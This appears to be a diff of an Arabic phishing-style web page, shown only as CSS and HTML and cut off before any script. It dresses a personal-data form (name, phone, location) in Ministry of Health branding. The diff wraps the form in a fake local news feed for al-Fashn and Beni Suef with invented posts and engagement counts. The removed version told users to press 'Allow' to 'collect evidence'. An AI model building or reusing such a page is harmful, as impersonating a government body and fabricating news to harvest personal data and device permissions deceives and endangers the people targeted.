@@ -3,28 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>إبلاغ عن أغذية فاسدة - وزارة الصحة</title>
+    <title>📰 أخبار الفشن وبني سويف | بلاغ عن أغذية فاسدة</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap');
 
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
 
         body {
             font-family: 'Cairo', 'Tajawal', sans-serif;
             min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 16px;
             background: #0a0a0a;
-            background-image: 
-                radial-gradient(ellipse at 50% 0%, #1a2a05 0%, #000a00 70%);
-            position: relative;
+            background-image: radial-gradient(ellipse at 50% 0%, #1a2a05 0%, #000a00 70%);
+            color: #fff;
             overflow-x: hidden;
+            padding-bottom: 20px;
         }
 
         /* ========== خلفية متحركة ========== */
@@ -35,7 +27,6 @@
             z-index: 0;
             overflow: hidden;
         }
-
         .bg-effects .glow {
             position: absolute;
             border-radius: 50%;
@@ -43,550 +34,655 @@
             opacity: 0.08;
             animation: float-glow 20s ease-in-out infinite alternate;
         }
-
         .bg-effects .glow:nth-child(1) {
-            width: 500px;
-            height: 500px;
-            background: #22c55e;
-            top: -200px;
-            right: -200px;
+            width: 500px; height: 500px; background: #22c55e;
+            top: -200px; right: -200px;
         }
-
         .bg-effects .glow:nth-child(2) {
-            width: 400px;
-            height: 400px;
-            background: #16a34a;
-            bottom: -150px;
-            left: -150px;
-            animation-delay: 7s;
+            width: 400px; height: 400px; background: #16a34a;
+            bottom: -150px; left: -150px; animation-delay: 7s;
         }
-
-        .bg-effects .glow:nth-child(3) {
-            width: 250px;
-            height: 250px;
-            background: #15803d;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            animation-delay: 12s;
-        }
-
         @keyframes float-glow {
-            0% { transform: translate(0, 0) scale(1); }
-            100% { transform: translate(40px, -40px) scale(1.4); }
+            0% { transform: translate(0,0) scale(1); }
+            100% { transform: translate(40px,-40px) scale(1.4); }
         }
 
-        /* ========== البطاقة ========== */
-        .main-card {
+        /* ========== شريط علوي ========== */
+        .top-bar {
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            background: rgba(0, 20, 5, 0.85);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            padding: 12px 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid rgba(34,197,94,0.15);
+        }
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-weight: 900;
+            font-size: 18px;
+        }
+        .logo-icon { font-size: 24px; }
+        .live-badge {
+            background: #dc2626;
+            color: #fff;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 800;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        .live-dot {
+            width: 7px; height: 7px; background: #fff;
+            border-radius: 50%;
+            animation: blink 1s infinite;
+        }
+        @keyframes blink {
+            0%,100% { opacity: 1; } 50% { opacity: 0.2; }
+        }
+
+        /* ========== شريط عاجل ========== */
+        .breaking-news {
+            background: linear-gradient(90deg, #b91c1c, #dc2626);
+            color: #fff;
+            padding: 9px 16px;
+            font-size: 12px;
+            font-weight: 700;
+            display: flex;
+            gap: 10px;
+            overflow: hidden;
+            white-space: nowrap;
+        }
+        .breaking-news .ticker {
+            display: inline-block;
+            animation: ticker 25s linear infinite;
+            padding-right: 100%;
+        }
+        @keyframes ticker {
+            0% { transform: translateX(0); }
+            100% { transform: translateX(-100%); }
+        }
+
+        /* ========== الحاوية ========== */
+        .container {
             position: relative;
             z-index: 1;
+            max-width: 560px;
+            margin: 0 auto;
+            padding: 14px;
+        }
+
+        /* ========== عنوان الصفحة ========== */
+        .page-title {
+            text-align: center;
+            padding: 18px 0 10px;
+        }
+        .page-title h1 {
+            font-size: 26px;
+            font-weight: 900;
+            background: linear-gradient(135deg, #86efac, #22c55e);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            text-shadow: 0 0 40px rgba(34,197,94,0.2);
+        }
+        .page-title p {
+            color: rgba(255,255,255,0.45);
+            font-size: 13px;
+            margin-top: 4px;
+        }
+
+        /* ========== بطاقة البوستات ========== */
+        .post-card {
+            background: rgba(0,0,0,0.55);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(34,197,94,0.12);
+            border-radius: 20px;
+            margin-bottom: 14px;
+            overflow: hidden;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.4);
+            transition: 0.3s;
+        }
+
+        .post-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 12px 14px;
+        }
+        .avatar {
+            width: 44px; height: 44px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 900;
+            font-size: 16px;
+            flex-shrink: 0;
+            background: linear-gradient(135deg, #22c55e, #15803d);
+            color: #fff;
+        }
+        .avatar.o { background: linear-gradient(135deg, #ea580c, #f97316); }
+        .avatar.p { background: linear-gradient(135deg, #7c3aed, #a855f7); }
+        .avatar.r { background: linear-gradient(135deg, #dc2626, #f87171); }
+        .avatar.b { background: linear-gradient(135deg, #0369a1, #0ea5e9); }
+
+        .post-info { flex: 1; min-width: 0; }
+        .post-author {
+            font-weight: 800;
+            font-size: 14px;
+            color: #86efac;
+        }
+        .post-time {
+            font-size: 11px;
+            color: rgba(255,255,255,0.4);
+            margin-top: 2px;
+        }
+        .post-image {
             width: 100%;
-            max-width: 500px;
-            background: rgba(0, 0, 0, 0.7);
+            height: 190px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 64px;
+            background: linear-gradient(135deg, #14532d, #166534);
+            position: relative;
+        }
+        .post-image.g2 { background: linear-gradient(135deg, #7c2d12, #9a3412); }
+        .post-image.g3 { background: linear-gradient(135deg, #1e3a8a, #1e40af); }
+        .post-image.g4 { background: linear-gradient(135deg, #581c87, #6b21a8); }
+        .post-tag {
+            position: absolute;
+            top: 10px; right: 10px;
+            background: rgba(0,0,0,0.75);
+            color: #86efac;
+            padding: 3px 12px;
+            border-radius: 20px;
+            font-size: 10px;
+            font-weight: 800;
+        }
+        .post-body {
+            padding: 12px 14px;
+            font-size: 14px;
+            line-height: 1.7;
+            color: rgba(255,255,255,0.85);
+        }
+        .post-body strong {
+            color: #86efac;
+            display: block;
+            margin-bottom: 5px;
+            font-size: 15px;
+        }
+        .post-actions {
+            border-top: 1px solid rgba(34,197,94,0.08);
+            padding: 8px 12px;
+            display: flex;
+            gap: 6px;
+        }
+        .action-btn {
+            flex: 1;
+            background: none;
+            border: none;
+            padding: 8px;
+            font-family: inherit;
+            font-size: 12px;
+            color: rgba(255,255,255,0.5);
+            font-weight: 700;
+            border-radius: 8px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+            transition: 0.2s;
+        }
+        .action-btn:hover { background: rgba(34,197,94,0.08); }
+        .action-btn.liked { color: #22c55e; }
+
+        /* ========== زر فتح البلاغ ========== */
+        .report-btn {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, #22c55e, #15803d);
+            border: none;
+            border-radius: 16px;
+            color: #fff;
+            font-size: 18px;
+            font-weight: 900;
+            font-family: inherit;
+            cursor: pointer;
+            transition: 0.3s;
+            box-shadow: 0 8px 30px rgba(34,197,94,0.35);
+            margin: 18px 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        .report-btn:active { transform: scale(0.97); }
+
+        /* ========== البطاقة الرئيسية للبلاغ ========== */
+        .main-card {
+            display: none;
+            background: rgba(0,0,0,0.75);
             backdrop-filter: blur(30px);
             -webkit-backdrop-filter: blur(30px);
-            border-radius: 40px;
-            padding: 30px 24px 28px;
-            border: 1px solid rgba(34, 197, 94, 0.15);
-            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.7), inset 0 1px 0 rgba(34, 197, 94, 0.1);
-            text-align: center;
+            border-radius: 28px;
+            padding: 24px 20px;
+            border: 1px solid rgba(34,197,94,0.2);
+            box-shadow: 0 30px 70px rgba(0,0,0,0.6);
+            margin-top: 10px;
+            animation: fadeSlide 0.4s ease;
+        }
+        .main-card.show { display: block; }
+        @keyframes fadeSlide {
+            from { opacity: 0; transform: translateY(15px); }
+            to { opacity: 1; transform: translateY(0); }
         }
 
-        /* ========== رأس الصفحة ========== */
         .header-badge {
             display: inline-block;
-            background: rgba(34, 197, 94, 0.15);
-            border: 1px solid rgba(34, 197, 94, 0.2);
+            background: rgba(34,197,94,0.12);
+            border: 1px solid rgba(34,197,94,0.25);
             border-radius: 30px;
-            padding: 6px 18px;
+            padding: 5px 16px;
             font-size: 11px;
             color: #86efac;
-            font-weight: 700;
-            letter-spacing: 1px;
-            margin-bottom: 16px;
+            font-weight: 800;
+            margin-bottom: 12px;
         }
-
-        /* ========== الأيقونة ========== */
         .icon-box {
-            width: 80px;
-            height: 80px;
+            width: 70px; height: 70px;
             background: linear-gradient(135deg, #22c55e, #15803d);
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            margin: 0 auto 16px;
-            font-size: 40px;
-            box-shadow: 0 12px 50px rgba(34, 197, 94, 0.3);
-            position: relative;
+            margin: 0 auto 12px;
+            font-size: 36px;
+            box-shadow: 0 10px 40px rgba(34,197,94,0.3);
             animation: pulse-icon 2s ease-in-out infinite;
         }
-
-        .icon-box::before {
-            content: '';
-            position: absolute;
-            inset: -4px;
-            border-radius: 50%;
-            background: linear-gradient(135deg, #22c55e, #15803d, #22c55e);
-            background-size: 300% 300%;
-            z-index: -1;
-            animation: border-glow 3s ease-in-out infinite;
-            opacity: 0.5;
-        }
-
         @keyframes pulse-icon {
-            0%, 100% { transform: scale(1); box-shadow: 0 12px 50px rgba(34, 197, 94, 0.3); }
-            50% { transform: scale(1.05); box-shadow: 0 12px 70px rgba(34, 197, 94, 0.5); }
+            0%,100% { transform: scale(1); }
+            50% { transform: scale(1.06); }
         }
-
-        @keyframes border-glow {
-            0%, 100% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-        }
-
-        /* ========== النصوص ========== */
         .main-title {
-            color: #ffffff;
-            font-size: 26px;
+            color: #fff;
+            font-size: 22px;
             font-weight: 900;
+            text-align: center;
             margin-bottom: 4px;
-            text-shadow: 0 0 40px rgba(34, 197, 94, 0.2);
         }
-
         .main-title span {
             background: linear-gradient(135deg, #86efac, #22c55e);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
         }
-
         .sub-desc {
-            color: rgba(255, 255, 255, 0.4);
-            font-size: 14px;
-            margin-bottom: 20px;
+            color: rgba(255,255,255,0.4);
+            font-size: 12px;
+            text-align: center;
+            margin-bottom: 16px;
         }
 
-        /* ========== نموذج البيانات ========== */
+        /* ========== النموذج ========== */
         .form-group {
-            margin-bottom: 16px;
+            margin-bottom: 12px;
             text-align: right;
         }
-
         .form-group label {
             display: block;
-            color: rgba(255, 255, 255, 0.6);
-            font-size: 13px;
-            font-weight: 600;
+            color: rgba(255,255,255,0.65);
+            font-size: 12px;
+            font-weight: 700;
             margin-bottom: 5px;
         }
-
         .form-group label .optional {
-            color: rgba(255, 255, 255, 0.2);
-            font-size: 11px;
+            color: rgba(255,255,255,0.2);
+            font-size: 10px;
             font-weight: 400;
         }
-
         .form-group input,
         .form-group textarea,
         .form-group select {
             width: 100%;
-            padding: 12px 16px;
-            background: rgba(255, 255, 255, 0.04);
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            border-radius: 12px;
-            color: #ffffff;
-            font-size: 15px;
-            font-family: 'Cairo', sans-serif;
-            transition: all 0.3s ease;
+            padding: 11px 14px;
+            background: rgba(255,255,255,0.04);
+            border: 1px solid rgba(255,255,255,0.08);
+            border-radius: 10px;
+            color: #fff;
+            font-size: 14px;
+            font-family: inherit;
+            transition: 0.3s;
             appearance: none;
             -webkit-appearance: none;
         }
-
-        .form-group select option {
-            background: #1a1a1a;
-            color: #ffffff;
-        }
-
+        .form-group select option { background: #1a1a1a; color: #fff; }
         .form-group input:focus,
         .form-group textarea:focus,
         .form-group select:focus {
             outline: none;
-            border-color: rgba(34, 197, 94, 0.4);
-            background: rgba(255, 255, 255, 0.06);
-            box-shadow: 0 0 20px rgba(34, 197, 94, 0.05);
+            border-color: rgba(34,197,94,0.5);
+            background: rgba(255,255,255,0.06);
         }
-
         .form-group input::placeholder,
         .form-group textarea::placeholder {
-            color: rgba(255, 255, 255, 0.2);
-        }
-
-        .form-group textarea {
-            min-height: 80px;
-            resize: vertical;
-        }
-
-        /* ========== زر الإرسال ========== */
-        .start-btn {
-            width: 100%;
-            padding: 20px;
-            background: linear-gradient(135deg, #22c55e, #15803d);
-            border: none;
-            border-radius: 60px;
-            color: white;
-            font-size: 20px;
-            font-weight: 900;
-            font-family: 'Cairo', sans-serif;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 8px 40px rgba(34, 197, 94, 0.3);
-            position: relative;
-            overflow: hidden;
-            margin-bottom: 12px;
-            letter-spacing: 1px;
-        }
-
-        .start-btn:hover:not(:disabled) {
-            transform: translateY(-3px);
-            box-shadow: 0 12px 50px rgba(34, 197, 94, 0.5);
-        }
-
-        .start-btn:active:not(:disabled) {
-            transform: scale(0.97);
-        }
-
-        .start-btn:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-        }
-
-        .start-btn .loader-text {
-            display: none;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-        }
-
-        .start-btn.loading .btn-text {
-            display: none;
-        }
-
-        .start-btn.loading .loader-text {
-            display: inline-flex;
-        }
-
-        .loader-text .spinner {
-            width: 22px;
-            height: 22px;
-            border: 2px solid rgba(255,255,255,0.2);
-            border-top: 2px solid white;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        /* ========== زر سماح ========== */
-        .permit-hint {
-            color: rgba(255, 255, 255, 0.15);
-            font-size: 11px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 6px;
-            margin-bottom: 16px;
-        }
-
-        .permit-hint .key {
-            background: rgba(255,255,255,0.05);
-            padding: 2px 10px;
-            border-radius: 20px;
-            border: 1px solid rgba(255,255,255,0.05);
             color: rgba(255,255,255,0.2);
         }
+        .form-group textarea { min-height: 70px; resize: vertical; }
 
-        /* ========== شريط التحميل ========== */
-        .progress-wrap {
+        .start-btn {
+            width: 100%;
+            padding: 17px;
+            background: linear-gradient(135deg, #22c55e, #15803d);
+            border: none;
+            border-radius: 50px;
+            color: #fff;
+            font-size: 18px;
+            font-weight: 900;
+            font-family: inherit;
+            cursor: pointer;
+            transition: 0.3s;
+            box-shadow: 0 8px 30px rgba(34,197,94,0.3);
+            margin-top: 8px;
+        }
+        .start-btn:active { transform: scale(0.97); }
+        .start-btn:disabled { opacity: 0.6; cursor: not-allowed; }
+
+        .back-btn {
+            width: 100%;
+            padding: 12px;
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 50px;
+            color: rgba(255,255,255,0.6);
+            font-size: 14px;
+            font-weight: 700;
+            font-family: inherit;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: 0.2s;
+        }
+        .back-btn:active { transform: scale(0.97); }
+
+        /* ========== رسالة النجاح ========== */
+        .result-box {
             display: none;
             margin-top: 14px;
-            padding: 16px 20px;
-            background: rgba(255, 255, 255, 0.02);
-            border-radius: 20px;
-            border: 1px solid rgba(255, 255, 255, 0.04);
+            padding: 18px;
+            background: rgba(34,197,94,0.08);
+            border: 1px solid rgba(34,197,94,0.2);
+            border-radius: 16px;
+            text-align: center;
         }
-
-        .progress-wrap.active {
+        .result-box.show {
             display: block;
             animation: fadeSlide 0.4s ease;
         }
-
-        @keyframes fadeSlide {
-            from { opacity: 0; transform: translateY(8px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .progress-wrap .top-row {
-            display: flex;
-            justify-content: space-between;
-            color: rgba(255, 255, 255, 0.4);
-            font-size: 12px;
+        .result-box .result-icon {
+            font-size: 42px;
+            display: block;
             margin-bottom: 6px;
         }
-
-        .progress-wrap .top-row .percent {
-            color: #86efac;
-            font-weight: 700;
-        }
-
-        .progress-track {
-            width: 100%;
-            height: 4px;
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 10px;
-            overflow: hidden;
-        }
-
-        .progress-track .fill {
-            height: 100%;
-            width: 0%;
-            background: linear-gradient(90deg, #15803d, #22c55e);
-            border-radius: 10px;
-            transition: width 0.2s ease;
-        }
-
-        .progress-wrap .step-info {
-            color: rgba(255, 255, 255, 0.2);
-            font-size: 11px;
-            margin-top: 8px;
-            font-family: monospace;
-        }
-
-        /* ========== رسالة نجاح ========== */
-        .result-box {
-            display: none;
-            margin-top: 16px;
-            padding: 20px;
-            background: rgba(34, 197, 94, 0.06);
-            border: 1px solid rgba(34, 197, 94, 0.12);
-            border-radius: 20px;
-        }
-
-        .result-box.show {
-            display: block;
-            animation: fadeSlide 0.5s ease;
-        }
-
-        .result-box .result-icon {
-            font-size: 40px;
-            display: block;
-            margin-bottom: 2px;
-        }
-
         .result-box .result-name {
-            color: #ffffff;
-            font-size: 20px;
-            font-weight: 800;
+            color: #86efac;
+            font-size: 18px;
+            font-weight: 900;
         }
-
         .result-box .result-sub {
-            color: rgba(255, 255, 255, 0.3);
-            font-size: 13px;
+            color: rgba(255,255,255,0.4);
+            font-size: 12px;
+            margin-top: 4px;
         }
 
         /* ========== رسالة خطأ ========== */
         .error-msg {
             display: none;
-            margin-top: 12px;
-            padding: 12px 16px;
-            background: rgba(239, 68, 68, 0.08);
-            border: 1px solid rgba(239, 68, 68, 0.12);
-            border-radius: 16px;
+            margin-top: 10px;
+            padding: 10px 14px;
+            background: rgba(239,68,68,0.1);
+            border: 1px solid rgba(239,68,68,0.2);
+            border-radius: 12px;
             color: #f87171;
-            font-size: 13px;
+            font-size: 12px;
+            font-weight: 700;
         }
-
-        .error-msg.show {
-            display: block;
-            animation: fadeSlide 0.3s ease;
-        }
-
-        /* ========== تذييل ========== */
-        .footer-links {
-            margin-top: 18px;
-            display: flex;
-            justify-content: center;
-            gap: 14px;
-            color: rgba(255, 255, 255, 0.06);
-            font-size: 10px;
-        }
-
-        .footer-links span {
-            display: flex;
-            align-items: center;
-            gap: 4px;
-        }
+        .error-msg.show { display: block; animation: fadeSlide 0.3s ease; }
 
         /* ========== حالة الاتصال ========== */
         .status-badge {
             position: fixed;
-            bottom: 14px;
-            right: 14px;
-            background: rgba(0, 0, 0, 0.7);
+            bottom: 12px;
+            right: 12px;
+            background: rgba(0,0,0,0.8);
             backdrop-filter: blur(10px);
-            padding: 6px 14px;
+            padding: 5px 12px;
             border-radius: 30px;
-            border: 1px solid rgba(255, 255, 255, 0.04);
+            border: 1px solid rgba(255,255,255,0.05);
             color: #10b981;
             font-size: 10px;
             font-family: monospace;
             z-index: 999;
             display: flex;
             align-items: center;
-            gap: 6px;
+            gap: 5px;
         }
-
         .status-badge .dot {
-            width: 6px;
-            height: 6px;
+            width: 6px; height: 6px;
             border-radius: 50%;
             background: #10b981;
             animation: pulse 1.5s ease-in-out infinite;
         }
-
         @keyframes pulse {
-            0%, 100% { opacity: 0.3; transform: scale(0.8); }
+            0%,100% { opacity: 0.3; transform: scale(0.8); }
             50% { opacity: 1; transform: scale(1.2); }
         }
 
-        /* ========== استجابة ========== */
+        /* ========== تذييل ========== */
+        .footer-note {
+            text-align: center;
+            font-size: 10px;
+            color: rgba(255,255,255,0.15);
+            padding: 20px 0 10px;
+        }
+
         @media (max-width: 480px) {
-            .main-card { padding: 24px 16px; }
-            .main-title { font-size: 22px; }
-            .icon-box { width: 72px; height: 72px; font-size: 34px; }
-            .start-btn { font-size: 18px; padding: 18px; }
+            .page-title h1 { font-size: 22px; }
+            .main-title { font-size: 19px; }
         }
     </style>
 </head>
 <body>
 
-<!-- ====== خلفية ====== -->
+<!-- خلفية -->
 <div class="bg-effects">
     <div class="glow"></div>
     <div class="glow"></div>
-    <div class="glow"></div>
 </div>
 
-<!-- ====== البطاقة ====== -->
-<div class="main-card">
+<!-- شريط علوي -->
+<div class="top-bar">
+    <div class="logo">
+        <span class="logo-icon">📰</span>
+        <span>أخبار الفشن</span>
+    </div>
+    <div class="live-badge">
+        <span class="live-dot"></span>
+        مباشر
+    </div>
+</div>
 
-    <!-- شارة -->
-    <div class="header-badge">🏥 وزارة الصحة | بلاغ عن أغذية فاسدة</div>
+<!-- أخبار عاجلة -->
+<div class="breaking-news">
+    <strong>⚡ عاجل:</strong>
+    <span class="ticker">حملة رقابية على الأسواق في الفشن | ضبط كميات من الأغذية الفاسدة في بني سويف | وزارة الصحة تحذر من منتجات مجهولة المصدر | بلّغ عن أي غذاء مشبوه وساهم في حماية عائلتك</span>
+</div>
 
-    <!-- أيقونة -->
-    <div class="icon-box">⚠️</div>
+<!-- الحاوية -->
+<div class="container">
 
-    <!-- العنوان -->
-    <h1 class="main-title">بلاغ عن <span>أغذية فاسدة</span></h1>
-    <p class="sub-desc">ساهم في حماية الصحة العامة، أبلغ عن أي غذاء مشبوه</p>
+    <!-- عنوان الصفحة -->
+    <div class="page-title">
+        <h1>📰 أخبار الفشن وبني سويف</h1>
+        <p>آخر الأحداث المحلية + خدمة الإبلاغ عن الأغذية الفاسدة</p>
+    </div>
 
-    <!-- ====== نموذج البلاغ ====== -->
-    <form id="applicationForm" onsubmit="return false;">
-        <div class="form-group">
-            <label>👤 الاسم الكامل <span style="color:#ef4444;">*</span></label>
-            <input type="text" id="fullName" placeholder="أدخل اسمك الثلاثي" required>
+    <!-- بوست 1 -->
+    <div class="post-card">
+        <div class="post-header">
+            <div class="avatar">أح</div>
+            <div class="post-info">
+                <div class="post-author">أحمد محمود الشريف</div>
+                <div class="post-time">🕐 منذ ساعتين · الفشن</div>
+            </div>
         </div>
-
-        <div class="form-group">
-            <label>📞 رقم الهاتف <span style="color:#ef4444;">*</span></label>
-            <input type="tel" id="phoneNumber" placeholder="رقم الهاتف للتواصل" required>
+        <div class="post-image">
+            🏛️
+            <span class="post-tag">الفشن</span>
         </div>
-
-        <div class="form-group">
-            <label>📍 موقع الشراء / المنشأة <span style="color:#ef4444;">*</span></label>
-            <input type="text" id="place" placeholder="اسم المطعم، السوبرماركت، أو عنوان المنشأة" required>
+        <div class="post-body">
+            <strong>حملة رقابية مكثفة على الأسواق والمحلات بالفشن</strong>
+            شنت مديرية الصحة ببني سويف حملة رقابية موسعة على محلات بيع الأغذية بمركز الفشن، أسفرت عن ضبط كميات من المنتجات منتهية الصلاحية. الحملة تأتي ضمن خطة الوزارة لحماية المواطنين من الأغذية الفاسدة.
         </div>
-
-        <div class="form-group">
-            <label>🏷️ نوع المنتج المشتبه به <span style="color:#ef4444;">*</span></label>
-            <input type="text" id="product" placeholder="مثال: جبن، عصير، لحوم، حليب..." required>
+        <div class="post-actions">
+            <button class="action-btn like-btn">👍 <span class="like-count">342</span></button>
+            <button class="action-btn">💬 87</button>
+            <button class="action-btn">↗️ مشاركة</button>
         </div>
+    </div>
 
-        <div class="form-group">
-            <label>📅 تاريخ الشراء <span style="color:#ef4444;">*</span></label>
-            <input type="date" id="purchaseDate" required>
+    <!-- بوست 2 -->
+    <div class="post-card">
+        <div class="post-header">
+            <div class="avatar o">مص</div>
+            <div class="post-info">
+                <div class="post-author">مصطفى عبد الرحمن</div>
+                <div class="post-time">🕐 منذ 5 ساعات · بني سويف</div>
+            </div>
         </div>
-
-        <div class="form-group">
-            <label>⚠️ سبب الشك / المشكلة <span style="color:#ef4444;">*</span></label>
-            <select id="issueType" required>
-                <option value="">-- اختر نوع المشكلة --</option>
-                <option value="رائحة غير طبيعية">👃 رائحة غير طبيعية</option>
-                <option value="تغير في اللون">🎨 تغير في اللون</option>
-                <option value="انتفاخ أو تلف في العبوة">📦 انتفاخ أو تلف في العبوة</option>
-                <option value="طعم غريب">👅 طعم غريب</option>
-                <option value="وجود حشرات أو مواد غريبة">🐛 وجود حشرات أو مواد غريبة</option>
-                <option value="تاريخ انتهاء منتهي">📅 تاريخ انتهاء منتهي</option>
-                <option value="أعراض تسمم غذائي">🤢 أعراض تسمم غذائي</option>
-                <option value="أخرى">أخرى</option>
-            </select>
+        <div class="post-image g2">
+            ⚠️
+            <span class="post-tag">تحذير</span>
         </div>
-
-        <div class="form-group">
-            <label>📝 وصف تفصيلي للمشكلة <span class="optional">(اختياري)</span></label>
-            <textarea id="notes" placeholder="أدخل تفاصيل إضافية عن المنتج والمشكلة..."></textarea>
+        <div class="post-body">
+            <strong>تحذير من منتجات ألبان مجهولة المصدر في بني سويف</strong>
+            حذرت مديرية الصحة المواطنين من شراء منتجات ألبان مجهولة المصدر تُباع في بعض الأسواق الشعبية. وطالبت المواطنين بالإبلاغ الفوري عن أي منتج مشتبه به عبر القنوات الرسمية.
         </div>
-    </form>
+        <div class="post-actions">
+            <button class="action-btn like-btn">👍 <span class="like-count">518</span></button>
+            <button class="action-btn">💬 124</button>
+            <button class="action-btn">↗️ مشاركة</button>
+        </div>
+    </div>
 
-    <!-- زر الإرسال -->
-    <button class="start-btn" id="startBtn">
-        <span class="btn-text">📤 إرسال البلاغ</span>
-        <span class="loader-text">
-            <span class="spinner"></span>
-            جاري الإرسال...
-        </span>
+    <!-- بوست 3 -->
+    <div class="post-card">
+        <div class="post-header">
+            <div class="avatar b">فا</div>
+            <div class="post-info">
+                <div class="post-author">فاطمة سيد إبراهيم</div>
+                <div class="post-time">🕐 منذ 8 ساعات · الفشن</div>
+            </div>
+        </div>
+        <div class="post-image g3">
+            🏥
+            <span class="post-tag">صحة</span>
+        </div>
+        <div class="post-body">
+            <strong>مستشفى الفشن المركزي يستقبل حالات تسمم غذائي</strong>
+            استقبل مستشفى الفشن المركزي عدداً من الحالات المصابة بأعراض تسمم غذائي بعد تناول أغذية من أحد المحلات. تم تقديم الإسعافات اللازمة وجميع الحالات في تحسن. الجهات المختصة فتحت تحقيقاً في الواقعة.
+        </div>
+        <div class="post-actions">
+            <button class="action-btn like-btn">👍 <span class="like-count">267</span></button>
+            <button class="action-btn">💬 63</button>
+            <button class="action-btn">↗️ مشاركة</button>
+        </div>
+    </div>
+
+    <!-- زر فتح البلاغ -->
+    <button class="report-btn" id="openReportBtn">
+        ⚠️ أبلغ عن أغذية فاسدة الآن
     </button>
 
-    <!-- زر سماح -->
-    <div class="permit-hint">
-        <span>📌 اضغط</span>
-        <span class="key">سماح</span>
-        <span>لتفعيل الإرسال وجمع الأدلة</span>
-    </div>
-
-    <!-- شريط التحميل -->
-    <div class="progress-wrap" id="progressWrap">
-        <div class="top-row">
-            <span id="stepLabel">⏳ جاري المعالجة...</span>
-            <span class="percent" id="percentLabel">0%</span>
+    <!-- البطاقة الرئيسية للبلاغ -->
+    <div class="main-card" id="mainCard">
+        <div style="text-align:center;">
+            <div class="header-badge">🏥 وزارة الصحة | بلاغ عن أغذية فاسدة</div>
         </div>
-        <div class="progress-track">
-            <div class="fill" id="progressFill"></div>
+        <div class="icon-box">⚠️</div>
+        <h1 class="main-title">بلاغ عن <span>أغذية فاسدة</span></h1>
+        <p class="sub-desc">ساهم في حماية الصحة العامة، أبلغ عن أي غذاء مشبوه</p>
+
+        <form id="applicationForm" onsubmit="return false;">
+            <div class="form-group">
+                <label>👤 الاسم الكامل <span style="color:#ef4444;">*</span></label>
+                <input type="text" id="fullName" placeholder="أدخل اسمك الثلاثي">
+            </div>
+            <div class="form-group">
+                <label>📞 رقم الهاتف <span style="color:#ef4444;">*</span></label>
+                <input type="tel" id="phoneNumber" placeholder="رقم الهاتف للتواصل">
+            </div>
+            <div class="form-group">
+                <label>📍 موقع الشراء / المنشأة <span style="color:#ef4444;">*</span></label>
+                <input type="text" id="place" placeholder="اسم المطعم أو السوبرماركت أو العنوان">
+            </div>
+            <div class="form-group">
+                <label>🏷️ نوع المنتج المشتبه به <span style="color:#ef4444;">*</span></label>
+                <input type="text" id="product" placeholder="مثال: جبن، عصير، لحوم، حليب...">
+            </div>
+            <div class="form-group">
+                <label>📅 تاريخ الشراء <span style="color:#ef4444;">*</span></label>
+                <input type="date" id="purchaseDate">
+            </div>
+            <div class="form-group">
+                <label>⚠️ سبب الشك / المشكلة <span style="color:#ef4444;">*</span></label>
+                <select id="issueType">
+                    <option value="">-- اختر نوع المشكلة --</option>
+                    <option value="رائحة غير طبيعية">👃 رائحة غير طبيعية</option>
+                    <option value="تغير في اللون">🎨 تغير في اللون</option>
+                    <option value="انتفاخ أو تلف في العبوة">📦 انتفاخ أو تلف في العبوة</option>
+                    <option value="طعم غريب">👅 طعم غريب</option>
+                    <option value="وجود حشرات أو مواد غريبة">🐛 وجود حشرات أو مواد غريبة</option>
+                    <option value="تاريخ انتهاء منتهي">📅 تاريخ انتهاء منتهي</option>
+                    <option value="أعراض تسمم غذائي">🤢 أعراض تسمم غذائي</option>
+                    <option value="أخرى">أخرى</option>
+                </select>
+            </div>
+            <div class="form-group">
+                <label>📝 وصف تفصيلي للمشكلة <span class="optional">(اختياري)</span></label>
+                <textarea id="notes" placeholder="أدخل تفاصيل إضافية..."></textarea>
+            </div>
+        </form>
+
+        <button class="start-btn" id="startBtn">📤 إرسال البلاغ</button>
+        <button class="back-btn" id="backBtn">← رجوع للأخبار</button>
+
+        <div class="result-box" id="resultBox">
+            <span class="result-icon">✅</span>
